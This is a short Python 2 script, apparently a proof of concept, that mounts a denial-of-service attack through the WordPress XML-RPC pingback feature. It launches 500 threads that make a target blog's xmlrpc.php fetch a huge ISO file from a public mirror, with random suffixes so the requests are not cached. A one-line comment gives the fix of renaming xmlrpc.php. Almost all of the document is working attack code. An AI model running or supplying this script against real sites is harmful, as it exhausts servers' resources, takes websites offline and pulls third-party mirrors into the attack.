#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: Dong Guo
# Last Modified: 2014/12/27

# how to fix this bug: 
# sudo mv xmlrpc.php xmlrpc.php.bak

from xmlrpclib import ServerProxy
from random import randint
from threading import Thread

# define target
target_url = "http://heylinux.com/archives/1.html"
huge_file = "http://mirrors.aliyun.com/centos/6.6/isos/x86_64/CentOS-6.6-x86_64-bin-DVD1.iso#i%d"

# fetch pingback url 
pingback_url = 'http://heylinux.com/xmlrpc.php'

# attack 
def attack():
    server = ServerProxy(pingback_url)
    try: 
        server.pingback.ping(huge_file % randint(10,10000000000000), target_url)
    except:
        pass

print "target_url: {0}".format(target_url)
print "pingback_url: {0}".format(pingback_url)

for i in range(500):
    Thread(target=attack).start()

print "attacking..."
